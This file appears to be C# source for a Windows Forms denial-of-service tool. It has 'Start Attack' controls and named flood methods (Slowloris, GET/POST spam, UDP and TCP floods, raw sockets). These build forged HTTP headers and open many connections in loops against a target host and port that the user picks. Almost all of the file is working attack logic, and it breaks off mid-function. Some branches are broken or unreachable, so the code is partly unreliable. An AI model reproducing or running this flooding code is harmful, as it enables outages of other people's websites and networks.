
/*

(c) All Rights Reserved, Dashies Software Inc.
 
*/

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using System.Resources;
using System.Reflection;
using System.Security;
using System.Runtime.InteropServices;

namespace src
{
    public partial class Main : Form
    {
        Tools tool = new Tools();
        Dash_Library Get = new Dash_Library();
        Control_Lib Misc = new Control_Lib();
        Attack_Methods attack = new Attack_Methods();


        private struct Debug
        {
            public bool status;
            public int startuplog;
        };

        public void Boot() {
            this.Hide();

            /* Hello Future, add a splash screen here. */

            this.Show();
        }

        ToolTip tooltip = new ToolTip
        {
            UseAnimation = true,
            UseFading = true,
            ToolTipTitle = "Hey!"
        };


        private static String Send = String.Empty, Method = String.Empty, Type = String.Empty, Host = String.Empty;
        public static Boolean timeout = false, SlowDash = false, Slowloris = false, IsRunning = false, RawClient = false, SocketClient = false, UdpClient = false, TcpClient = false;//, Booted = false;

        public static int ExtendedMode = 0, Red = 32, Green = 32, Blue = 32;
        private static ProtocolType SpecificProtocol;

        private PictureBox department = new PictureBox(), yay = new PictureBox();
        private Panel Layer = new Panel();
        private Debug debug;

        private static Label title = new Label(), methodtitle = new Label(), typetitle = new Label(),
            url = new Label(), port = new Label(), useragent = new Label(), duration = new Label(), cookie = new Label(), workers = new Label(), data = new Label();

        private static Button UpdateLog = new Button(), ClearLog = new Button(), Ping = new Button(), Attack = new Button(), StopAttack = new Button(),
            quit = new Button(), minimize = new Button(), AdvancedOptions = new Button();

        private static TextBox Url = new TextBox(), Duration = new TextBox(), Port = new TextBox(), Cookie = new TextBox(), Workers = new TextBox(), Data = new TextBox(), Status = new TextBox(), UserAgent = new TextBox();




        public Main()
        {
            InitializeComponent();
            ResourceManager REGEX = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());

            this.Icon = (Icon)REGEX.GetObject("icon");
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = Color.FromArgb(Red, Green, Blue);
            this.Height = 500;
            this.Width = 735;
            this.Text = "I ❤ D✿SH";

            Get.InjectImage(this, yay, 668, 151, 32, 32, "yay", String.Empty, 28, 28, 28);
            Get.InjectInputBox(this, "", Status, 325, 183, 375, 295, 8, 48, 48, 48, 180, 180, 180);
            
            tool.SetFormCursor(this, (Byte[])REGEX.GetObject("main"));
     
            Status.VisibleChanged += (sender, argumentation) =>
            {
                if (Status.Visible)
                {
                    Status.SelectionStart = Status.Text.Length;
                    Status.ScrollToCaret();
                }
            };

            Status.ScrollBars = ScrollBars.Vertical;
            Status.Multiline = true;
            Status.HideSelection = true;
            Status.AcceptsTab = true;
            Status.WordWrap = true;
            Status.ReadOnly = true;

            if (debug.startuplog == 0)
            {
                debug.startuplog = 1;
                Status.Text = StartLog();
            }

            department.MouseMove += (sentBy, msBeautiful) => { Misc.MiceMove(this, msBeautiful); };
            department.MouseDown += (sentBy, msBeautiful) => { Misc.MiceDown(msBeautiful); };

            title.MouseMove += (sentBy, msBeautiful) => { Misc.MiceMove(this, msBeautiful); };
            title.MouseDown += (sentBy, msBeautiful) => { Misc.MiceDown(msBeautiful); };

            debug.status = Get.InjectText(this, title, 0, 2, 285, 22, "(c) All Rights Reserved, Dashies Software Inc.", 8, 102, 35, 178, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.InjectButton(this, quit, "X", this.Width - 74, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.InjectButton(this, minimize, "-", this.Width - 148, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.CreateMenu(this, 0, 0, this.Width, 24, department, ("profile"), 28, 24, 1, 102, 35, 178);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            Get.InjectInputBox(this, "http://www.google.co.uk", Url, 50, 65, 375, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, url, (Url.Left + Url.Width) + 15, Url.Top, 100, 25, "URL or IP", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "Cookie=8f75a1acb808d4f709bc4d71b9ab0343", Cookie, 50, 92, 375, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, cookie, (Url.Left + Url.Width) + 15, Cookie.Top, 125, 25, "Cookie(s)", 10, 28, 28, 28, 255, 255, 255);

            cookie.MouseHover += (sent, longsocks) =>
            {
               tooltip.Show("this only works for the method HTTP Long Socks :o", cookie, 0, 0, 6000);
            };

            Get.InjectInputBox(this, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36", UserAgent, 50, 120, 375, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, useragent, (UserAgent.Left + UserAgent.Width) + 15, UserAgent.Top, 125, 25, "User-Agent", 10, 28, 28, 28, 255, 255, 255);

            useragent.MouseHover += (sent, longsocks) =>
            {
               tooltip.Show("this also only works for the method Long Socks :o", useragent, 0, 0, 6000);
            };

            Get.InjectInputBox(this, "f*ck with the best and die like the rest!", Data, 50, 148, 375, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, data, (Data.Left + Data.Width) + 15, Data.Top, 125, 25, "Packet Data", 10, 28, 28, 28, 255, 255, 255);

            data.MouseHover += (sent, longhighs) =>
            {
               tooltip.Show("this only works for the methods RAW, TCP and UDP.", data, 0, 0, 6000);
            };

            Get.InjectInputBox(this, "80", Port, 50, 195, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, port, (Port.Left + Port.Width) + 15, Port.Top, 75, 25, "Port", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "265", Duration, 50, 219, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, duration, (Duration.Left + Duration.Width) + 15, Duration.Top, 75, 25, "Seconds (seconds)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "5", Workers, 50, 243, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, workers, (Workers.Left + Workers.Width) + 15, Workers.Top, 75, 25, "Workers (processes)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, Attack, "Start Attack", 50, 367, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, StopAttack, "Stop Attack", 185, 367, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            
            Get.InjectButton(this, AdvancedOptions, "Other Options", 50, 401, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, Ping, "Ping Target", 185, 401, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);

            Get.InjectButton(this, UpdateLog, "Update Log", 50, 435, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, ClearLog, "Reset Log", 185, 435, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);

            Get.InjectPanel(this, Layer, 35, 47, this.Width - 70, this.Height - 70, 28, 28, 28);

            UpdateLog.Click += (sentby, longsockgirl) =>
            {
                Notification_UI Interface = new Notification_UI(1);
                Interface.ShowDialog();
            };

            AdvancedOptions.Click += (sentBy, ponyfirstplace) =>
            {
                attack.ShowDialog();
            };

            Ping.Click += (sentby, msbeautiful) =>
            {
                if (FormatUrl(Url.Text) == true)
                {
                    Pawng ping = new Pawng(Url.Text);
                    ping.ShowDialog();
                    Url.Text = "http://www.google.com";
                }
            };

            StopAttack.Click += (sentby, thicc) =>
            {
                if (IsRunning == false)
                {
                    Status.AppendText("* the server is not even running, ahaha :o\r\n");
                }
                else
                {
                    Status.AppendText("* received your stop signal, please give it a minimum of\r\n");
                    Status.AppendText("* 30 seconds, depending on your amount of workers, the\r\n");
                    Status.AppendText("* amount of threads need to finish their cycles.\r\n");
                    Status.AppendText("* when stopped to early, the following attacks will most\r\n");
                    Status.AppendText("* likely be less-effective or just effectiveless!\r\n");
                    PutDefaultSettings();
                    ExtendedMode = 0;
                }
            };

            Attack.Click += (sentby, msbeautiful) =>
            {
                Task AttackVector = Task.Run((Action)AttackSector);
            };

            ClearLog.Click += (sentby, msbeautiful) =>
            {
                if(ClearLog.Text != StartLog()) {
                    Task RUN = Task.Run((Action)ClearLawg);
                }
            };

            Duration.TextChanged += (sent, mystical) =>
            {
                try
                {
                    if ((Duration.Text.All(char.IsDigit) != true) && (Workers.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Duration, 0, -0, 1000);
                        Duration.Text = "265";
                    }
                }
                catch { }
            };

            Port.TextChanged += (sent, mystical) =>
            {
                try
                {
                    if ((Port.Text.All(char.IsDigit) != true) && (Port.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Port, 0, -0, 1000);
                        Port.Text = "80";
                    } else
                    {
                        if ((Convert.ToInt32(Port.Text) > 8080) || (Convert.ToInt32(Port.Text) <= 0))
                        {
                            tooltip.Show("choose a port between 1-8080", Port, 0, -0, 1000);
                            Port.Text = "80";
                        }    
                    }
                }
                catch { }
            };

            Workers.TextChanged += (sent, mystical) =>
            {
                try
                {
                    if ((Workers.Text.All(char.IsDigit) != true) && (Workers.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Workers, 0, -0, 1000);
                        Workers.Text = "5";
                    }
                    else if (Convert.ToInt32(Workers.Text) >= 150)
                    {
                        MessageBox.Show("You do know that this amount of workers can either crash your network or your device? just saying x) \r\n\r\noof, please be sure to restart the application after attacking with this many shits, because the app takes a while to kill all the workers when you use such a big amount.", "Lol");
                    }
                }
                catch { }
            };

            quit.Click += (sentBy, msValentine) => 
            {
                this.Close(); 
            };

            minimize.Click += (sentBy, msValentine) => {
                this.WindowState = FormWindowState.Minimized;
            };
        }




        private void AttackSector()
        {
            if(IsRunning == true)
            {
                Status.AppendText("* Ugh, you are already over running the server my lady.\r\n");
            }
            else
            {
                if(FormatUrl(Url.Text) == true)
                {
                    if((Duration.Text.Length <= 0) || (Url.Text.Length <= 0) || (Cookie.Text.Length <= 0) || (UserAgent.Text.Length <= 0) || (Workers.Text.Length <= 0) || (Port.Text.Length <= 0))
                    {
                        String insufficient = "insufficient input received";

                        List<TextBox> Simplified = new List<TextBox>
                            {
                                Duration,
                                Workers,
                                Port,
                                Cookie,
                                UserAgent,
                                Data
                            };

                        foreach(TextBox ID in Simplified)
                        {
                            tooltip.Show(insufficient, ID, 0, -0, 1000);
                        }
                    }
                    else
                    {
                        string[] AttackMethods = { "SLOWLORIS", "SLOWDASH", "POST_SPAM", "GET_SPAM", "HEAD_SPAM" };
                        if(attack.MethodType >= AttackMethods.Length)
                        {
                            Status.AppendText("* invalid method type received >.< using default one!");
                            attack.MethodType = 2;
                        }

                        string[] AttackTypes = { "HTTP_LONG_SOCKS", "UDP_JUICES", "UDP_HAM", "UDP_TSUNAMI", "TCP_SHITS", "TCP_WAVES", "RAW_MEAT" };
                        if(attack.AttackType >= AttackTypes.Length)
                        {
                            Status.AppendText("* invalid attack type received, oof, using default one ey!");
                            attack.AttackType = 0;
                        }

                        Method = AttackMethods[attack.MethodType];
                        Type = AttackTypes[attack.AttackType];

                        IsRunning = true;
                        timeout = false;

                        Status.AppendText("* initializing Attack ....\r\n");
                        System.Threading.Thread.Sleep(1000);

                        if(Url.Text.Contains("http://"))
                        {
                            Host = Url.Text.Replace("http://", "");
                        }
                        else

                        if(Url.Text.Contains("https://"))
                        {
                            Host = Url.Text.Replace("https://", "");
                        }

                        string subMethod = String.Empty, subCaching = String.Empty, subConnection = String.Empty, subHTTPVersion = String.Empty, subPragma = String.Empty;

                        String[] CacheTypes = { "no-store", "no-cache", "none" },
                                 ConnectionTypes = { "keep-alive", "close" },
                                 HttpVersion = { "1.0", "1.1", "1.2" },
                                 Pragma = { "Pragma: no-cache", "" };

                        subCaching = CacheTypes[attack.Caching];
                        subConnection = "Connection: " + ConnectionTypes[attack.Connection];
                        subHTTPVersion = "HTTP/" + HttpVersion[attack.HTTPVersion];
                        subPragma = Pragma[attack.Pragma];

                        /*
                            Add in the method shits
                        */

                        for (int index = 0; index <= Convert.ToInt32(Workers.Text) - 1; index += 1)
                        {
                            if(Type == "HTTP_LONG_SOCKS")
                            {
                                if((Method == "POST_SPAM") || (Method == "HEAD_SPAM") || (Method == "SLOWDASH") || (Method == "SLOWLORIS"))
                                {
                                    subMethod = "POST";
                                    Send = ($"{subMethod} / {subHTTPVersion}\r\n");
                                }
                                
                                if(Method == "GET_SPAM")
                                {
                                    subMethod = "GET";
                                    Send = ($"{subMethod} / {subHTTPVersion}\r\n") +
                                           ($"Host: {Host}\r\n") +
                                           ($"{subConnection}") +
                                           ("\r\nUpgrade-Insecure-Requests: 1\r\n") +
                                           ($"User-Agent: {UserAgent.Text}\r\n") +
                                           ($"Cookie: Accept_Cookie=SSBwcmVmZXIgY29va2llcyE=; {Cookie.Text}\r\n\r\n");
                                }

                                if((Method == "SLOWDASH") || (Method == "HEAD_SPAM") || (Method == "POST_SPAM") || (Method == "SLOWLORIS"))
                                {
                                    Send += ($"Host: {Host}\r\n") +
                                            ($"{subConnection}\r\n") +
                                            ($"{subPragma}\r\n") +
                                            ("Upgrade-Insecure-Requests: 1\r\n") +
                                            ($"User-Agent: {UserAgent.Text}\r\n") +
                                            ("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n") +
                                            ("Accept-Encoding: gzip,deflate\r\n") +
                                            ("Origin: http://www.google.co.uk\r\n") +
                                            ("Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n") +
                                            ($"Cookie: Accept_Cookie=SSBwcmVmZXIgY29va2llcyE=; {Cookie.Text}; ") +
                                            ("Dash_Session=VGhlIGxvYWQgZnJvbSB0aGVzZSBwYWNrZXRSSBwcmVmZXIgY29va2llcyEzIHN0cmlrZSB1cG9uIHdob20gdGFyZ2V0ZWQsIG1lIG51aCBmZWVsIGJhZCBhYm91dCBpdCwgaSBhbSBkYXNoaWUsIGFuZCBzb21lIHNjcmlwdCBraWRkeSBpcyB1c2luZyB0aGlzIHRvb2wgdG8gZG9zIHlvdSwgbG9sLCBhbnl3ZWhzLCBoYXZlIGEgZ29vZCBkYXkgYzo; OOF=ZmFzbGtmbGthc2ZsO2thc2xmO2tzYWxmbmNuc2Fua3NmamFzZ25hc2drbGphc2dqa3Nha2psZ2prbGFzZ2prc2FrZ2psc2FqZ2FpaTM5aTNpMmkzOTk1MjkwMzY5MzgyODlma2phbGFmYWtjdm5hdjg5MDU5MDMybGxmYWZhMzIzamw0azJudmJuZGI=; CAKEPHP=SSBwcmVmZXIgY29va2llcyE; _pk_id.2.9278=482ceb68ec2fb4f4.1481370495.1.1481371739.1481370495.; _pk_ses.2.9278=*\r\n\r\n");
                                }

                                SocketClient = true;
                                SpecificProtocol = ProtocolType.Tcp; //IP
                            }
                            else
                            if(Type == "UDP_JUICES")
                            {
                                UdpClient = true;
                                Send = Data.Text + "\r\n";
                            }
                            else
                            if(Type == "UDP_HAM")
                            {
                                UdpClient = true;
                                Send = Data.Text + "\r\n";
                            }
                            else
                            if(Type == "UDP_TSUNAMI")
                            {
                                UdpClient = true;
                                Send = Data.Text + "\r\n";
                            }
                            else
                            if(Type == "TCP_WAVES")
                            {
                                TcpClient = true;
                                Send = Data.Text + "\r\n";
                            }
                            else
                            if(Type == "TCP_SHITS")
                            {
                                TcpClient = true;
                                Send = Data.Text + "\r\n";
                            }
                            else
                            if(Type == "RAW_MEAT")
                            {
                                RawClient = true;
                                SpecificProtocol = ProtocolType.IPv4;
                                Send = Data.Text + "\r\n";

                                ExtendedMode = 4;
                            }
                            else
                            {
                                SpecificProtocol = ProtocolType.Tcp;
                            }

                            if(attack.MethodType <= 1)
                            {
                                System.Threading.Thread.Sleep(650);
                            }

                            Task r4n = Task.Run((Action)SyncASend);

                            if(index == Convert.ToInt32(Workers.Text) - 1)
                            {
                                Task Call = Task.Run((Action)TimeSpan);
                            }
                        }
                    }
                }
            }
        }




        private static void PutDefaultSettings()
        {
            timeout = true;
            IsRunning = false;
        }




        private void ClearLawg()
        {
            if(Status.Text == StartLog())
            {
                Status.AppendText("* oof, there is nothing to clear, or IS THERE?\r\n");
            } else {
                for(int index = 5; index >= 1; index -= 1)
                {
                    Status.AppendText("* clearing this log in [" + index.ToString() + "]\r\n");
                    System.Threading.Thread.Sleep(1000);
                }
        
                Status.Text = StartLog();
            }
        }




        private static void TimeSpan()
        {
            WarningMessage();

            if(Type == "HTTP_LONG_SOCKS")
            {
                Status.AppendText($"* using type \"{Type}\" and method \"{Method}\"!\r\n");
            }
            else
            {
                Status.AppendText($"* using type \"{Type}\" !\r\n");
            }

            Status.AppendText("* attack has started successfully!\r\n");

            System.Threading.Thread.Sleep(Convert.ToInt32(Duration.Text) * 1000);
            PutDefaultSettings();
      
            Status.AppendText("* attack has stopped successfully!\r\n");
        }




        private static void WarningMessage()
        {
            Status.AppendText("\r\n=================================================\r\n\r\n");
            Status.AppendText("* the following data will be used, please make sure it\r\n");
            Status.AppendText("* is correct as any mistakes can harm the applications\r\n");
            Status.AppendText("* performance horribly.\r\n\r\n");
            Status.AppendText("=====================================\r\n\r\n");
            System.Threading.Thread.Sleep(5000);
            Status.AppendText(Send);
            Status.AppendText("=====================================================\r\n\r\n");
            Status.AppendText("* Please await workers, they are starting .... \r\n");
        }



        private static String GenerateSpam(int Cycle)
        {
            String SPAM = "SSBwcmVmZXIgY29va2llcyE=";

            for(int index = 0; index <= Cycle-1; index = index + 1)
            {
                SPAM += SPAM;
            }

            return SPAM;
        }




        private static String GetRandom()
        {
            String result = String.Empty, UserAgent = String.Empty;

            UserAgent = Guid.NewGuid().ToString("n").Substring(0, 50);

            result += ($"Host: {Host}\r\n") +
                      ("Connection: Close\r\n") + //keep-alive\r\n") +
                      ("Upgrade-Insecure-Requests: 1\r\n") +
                      ($"User-Agent: {UserAgent}\r\n") +
                      ("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n") +
                      ("Accept-Encoding: gzip,deflate\r\n") +
                      ("Origin: http://www.google.co.uk\r\n") +
                      ("Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n") +
                      ($"Cookie: Accept_Cookie=SSBwcmVmZXIgY29va2llcyE=; {Cookie.Text}; ") +
                      ("Dash_Session=VGhlIGxvYWQgZnJvbSB0aGVzZSBwYWNrZXRSSBwcmVmZXIgY29va2llcyEzIHN0cmlrZSB1cG9uIHdob20gdGFyZ2V0ZWQsIG1lIG51aCBmZWVsIGJhZCBhYm91dCBpdCwgaSBhbSBkYXNoaWUsIGFuZCBzb21lIHNjcmlwdCBraWRkeSBpcyB1c2luZyB0aGlzIHRvb2wgdG8gZG9zIHlvdSwgbG9sLCBhbnl3ZWhzLCBoYXZlIGEgZ29vZCBkYXkgYzo; OOF=ZmFzbGtmbGthc2ZsO2thc2xmO2tzYWxmbmNuc2Fua3NmamFzZ25hc2drbGphc2dqa3Nha2psZ2prbGFzZ2prc2FrZ2psc2FqZ2FpaTM5aTNpMmkzOTk1MjkwMzY5MzgyODlma2phbGFmYWtjdm5hdjg5MDU5MDMybGxmYWZhMzIzamw0azJudmJuZGI=; CAKEPHP=SSBwcmVmZXIgY29va2llcyE; _pk_id.2.9278=482ceb68ec2fb4f4.1481370495.1.1481371739.1481370495.; _pk_ses.2.9278=*\r\n\r\n");

            return result;
        }




        private static void SyncASend()
        {
            IPHostEntry entry;
            Uri grabIp = new Uri(Url.Text);
            List<Socket> SockBeefies = new List<Socket>();
            List<TcpClient> TcpBeefies = new List<TcpClient>();
            List<UdpClient> UdpBeefies = new List<UdpClient>();

            var ipResult = Dns.GetHostAddresses(grabIp.Host)[0];
            entry = Dns.GetHostEntry(ipResult);

            TcpClient TransmissionControlProtocol = new TcpClient(ipResult.ToString(), Convert.ToInt32(Port.Text));
            TcpAck.DATA = Encoding.ASCII.GetBytes(Send);

            var TcpWrite = TransmissionControlProtocol.GetStream();

            try
            {
                while (timeout == false)
                {
                    for (int index = 0; index <= 200; index += 1)
                    {
                        if (SocketClient == true) // Work on Custom Headers for GET and POST
                        {
                            if (ExtendedMode == 4)
                            {
                                Socket Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IPv4);

                                Beef.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                                Beef.ReceiveTimeout = 1;
                                Beef.SendTimeout = 1;
                                Beef.Send(TcpAck.DATA);
                                Beef.Close();

                                SockBeefies.Add(Beef);
                            }
                            else
                            if ((Method == "SLOWLORIS") && (Type == "HTTP_LONG_SOCKS"))
                            {
                                for (int sindex = 1; sindex <= 110; sindex += 1)
                                {
                                    Socket Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, SpecificProtocol);
                                    Beef.SetSocketOption(SocketOptionLevel.Tcp, SocketOptionName.NoChecksum, 1);

                                    Beef.Blocking = true;
                                    Beef.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                                    Beef.ReceiveTimeout = 1;
                                    Beef.SendTimeout = 1;
                                    Beef.Send(TcpAck.DATA);
                                    Beef.Close();

                                    SockBeefies.Add(Beef);
                                }

                                System.Threading.Thread.Sleep(700);
                            }
                            else
                            if ((Method == "DASHLORIS") && (Type == "HTTP_LONG_SOCKS"))
                            {
                                System.Threading.Thread.Sleep(2500);
                                Byte[] ByteToString = Encoding.ASCII.GetBytes(GenerateSpam(100));
                                Byte[] RandomBytesAndString = Encoding.ASCII.GetBytes(GetRandom());

                                for (int sindex = 0; sindex <= 128; sindex = sindex + 1)
                                {
                                    for (int eindex = 0; eindex <= 64; eindex += 1) {
                                        Socket Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, SpecificProtocol);

                                        Beef.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.BlockSource, true);

                                        Beef.Blocking = true;
                                        Beef.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                                        Beef.ReceiveTimeout = 1;
                                        Beef.SendTimeout = 1;
                                        Beef.Send(RandomBytesAndString);
                                        Beef.Send(ByteToString);
                                        Beef.Close();

                                        SockBeefies.Add(Beef);
                                    }

                                    System.Threading.Thread.Sleep(650);
                                }
                            }
                            else
                            if (Type == "HTTP_LONG_SOCKS")
                            {
                                Socket Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, SpecificProtocol);

                                Beef.Blocking = true;
                                Beef.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                                Beef.ReceiveTimeout = 1;
                                Beef.SendTimeout = 1;
                                Beef.Send(TcpAck.DATA);
                                Beef.Close();

                                SockBeefies.Add(Beef);
                            }
                        }


                        else
                        if (TcpClient == true)
                        {
                            if (Type == "TCP_SHITS")
                            {
                                Task Rawn = Task.Run((Action)AddTCPThread);
                            }
                            else
                            if (Type == "TCP_WAVES")
                            {
                                Random rd = new Random();

                                for (int sindex = 0; sindex <= rd.Next(5, 100); sindex += 1)
                                {
                                    Task Rawn = Task.Run((Action)AddRandomTCPThread);
                                    System.Threading.Thread.Sleep(rd.Next(750, 3500));
                                }

                                System.Threading.Thread.Sleep(rd.Next(2000, 9000));
                            }
                        }


                        else
                        if (UdpClient == true)
                        {
                            Boolean SpecificAmount = false, Slow = false;
                            int Amount = 0, Miliseconds = 0;

                            if (Type == "UDP_JUICES")
                            {
                                System.Threading.Thread.Sleep(1000);
                                SpecificAmount = true;
                                Miliseconds = 1500;
                                Amount = 64;
                            }
                            else
                            if (Type == "UDP_HAM")
                            {
                                System.Threading.Thread.Sleep(2500);

                                SpecificAmount = true;
                                Amount = 256;
                            }
                            else
                            if (Type == "UDP_TSUNAMI")
                            {
                                Task AddUDPThread = Task.Run((Action)AddUdpThread);
                            }

                            if (SpecificAmount == true)
                            {
                                for (int sindex = 0; sindex <= Amount; sindex += 1)
                                {
                                    UdpClient UserDatagramProtocol = new UdpClient(ipResult.ToString(), Convert.ToInt32(Port.Text));
                                    UserDatagramProtocol.Ttl = 10000;

                                    UserDatagramProtocol.Connect(ipResult.ToString(), Convert.ToInt32(Port.Text));
                                    UserDatagramProtocol.Send(TcpAck.DATA, Send.Length);
                                    UserDatagramProtocol.Close();

                                    UdpBeefies.Add(UserDatagramProtocol);

                                    if(Slow == true)
                                    {
                                        System.Threading.Thread.Sleep(Miliseconds);
                                    }
                                }
                            }
                        }


                        else
                        if (RawClient == true)
                        {
                            if (Type == "RAW_MEAT")
                            {
                                Random rd = new Random();
                                ProtocolType mySet = ProtocolType.Raw;
                                int Protocol = rd.Next(0, 3);
                                
                                if(Protocol == 0 )
                                {
                                    mySet = ProtocolType.IP;
                                }
                                else
                                if(Protocol == 1)
                                {
                                    mySet = ProtocolType.IPv4;
                                }
                                else
                                if(Protocol == 2)
                                {
                                    mySet = ProtocolType.Raw;
                                }

                                Socket Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, mySet);

                                Beef.Blocking = true;
                                Beef.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                                Beef.ReceiveTimeout = 1;
                                Beef.SendTimeout = 1;
                                Beef.Send(TcpAck.DATA);
                                Beef.Close();

                                SockBeefies.Add(Beef);
                            }
                        }
                    }
                }
            }

            catch
            {
                SyncASend();
            }

            finally
            {
                foreach (Socket ID in SockBeefies)
                {
                    ID.Dispose();
                }

                foreach (TcpClient ID in TcpBeefies)
                {
                    ID.Dispose();
                }

                foreach (UdpClient ID in UdpBeefies)
                {
                    ID.Dispose();
                }
            }

            SocketClient = false;
            TcpClient = false;
            UdpClient = false;
            RawClient = false;
        }




        public struct TcpThread
        {
            public String ipResult;
            public Byte[] DATA;
        };

        public static TcpThread TcpAck;




        private static void AddUdpThread()
        {
            Uri grabIp = new Uri(Url.Text);
            List<UdpClient> UdpBeefies = new List<UdpClient>();
    
            TcpAck.DATA = Encoding.ASCII.GetBytes(GenerateSpam(250));

            var ipResult = Dns.GetHostAddresses(grabIp.Host)[0];
            for (int index = 0; index <= 16; index += 1)
            {
                UdpClient UserDatagramProtocol = new UdpClient(ipResult.ToString(), Convert.ToInt32(Port.Text));
                UserDatagramProtocol.Ttl = 10000;

                UserDatagramProtocol.Connect(ipResult.ToString(), Convert.ToInt32(Port.Text));
                UserDatagramProtocol.Send(TcpAck.DATA, Send.Length);
                UserDatagramProtocol.Close();

                UdpBeefies.Add(UserDatagramProtocol);
            }

            foreach(UdpClient Id in UdpBeefies)
            {
                Id.Dispose();
            }
        }




        private static void AddTCPThread()
        {
            IPHostEntry entry;
            Uri grabIp = new Uri(Url.Text);
            TcpClient TransmissionControlProtocol = new TcpClient();

            List<TcpClient> TcpBeefies = new List<TcpClient>();

            var TcpWrite = TransmissionControlProtocol.GetStream();
            var ipResult = Dns.GetHostAddresses(grabIp.Host)[0];

            TcpAck.DATA = Encoding.ASCII.GetBytes(GenerateSpam(250));
            entry = Dns.GetHostEntry(TcpAck.ipResult);

            for(int index = 0; index <= 150; index += 1)
            {
                TransmissionControlProtocol = new TcpClient(TcpAck.ipResult.ToString(), Convert.ToInt32(Port.Text));
                TransmissionControlProtocol.ReceiveTimeout = 0;
                TransmissionControlProtocol.SendTimeout = 10;

                TcpWrite = TransmissionControlProtocol.GetStream();
                TcpWrite.Write(TcpAck.DATA, 0, Send.Length);
                TcpWrite.Close();
                TcpWrite.Flush();

                TcpBeefies.Add(TransmissionControlProtocol);

                TransmissionControlProtocol.Close();
            }
            
            foreach(TcpClient Id in TcpBeefies)
            {
                Id.Dispose();
            }
        }

        private static void AddRandomTCPThread()
        {
            IPHostEntry entry;
            Random rd = new Random();
            Uri grabIp = new Uri(Url.Text);
            TcpClient TransmissionControlProtocol = new TcpClient();

            List<TcpClient> TcpBeefies = new List<TcpClient>();

            var TcpWrite = TransmissionControlProtocol.GetStream();
            var ipResult = Dns.GetHostAddresses(grabIp.Host)[0];

            TcpAck.DATA = Encoding.ASCII.GetBytes(GenerateSpam(100));
            entry = Dns.GetHostEntry(ipResult);

            for (int index = 0; index <= rd.Next(5, 150); index += 1)
            {
                System.Threading.Thread.Sleep(rd.Next(500, 5000));

                TransmissionControlProtocol = new TcpClient(TcpAck.ipResult.ToString(), Convert.ToInt32(Port.Text));
                TransmissionControlProtocol.ReceiveTimeout = 0;
                TransmissionControlProtocol.SendTimeout = 10;

                TcpWrite = TransmissionControlProtocol.GetStream();
                TcpWrite.Write(TcpAck.DATA, 0, Send.Length);
                TcpWrite.Flush();
                TcpWrite.Close();

                TcpBeefies.Add(TransmissionControlProtocol);

                TransmissionControlProtocol.Close();
            }

            foreach(TcpClient Id in TcpBeefies)
            {
                Id.Dispose();
            }
        }




        private Boolean FormatUrl(String uri)
        {
            if(uri.Length <= 0)
            {
                return false;
            }
            
            if ((uri.Contains("http://") != true) && (uri.Contains("https://") != true) && (!IPAddress.TryParse(uri, out IPAddress m_address))) 
            {
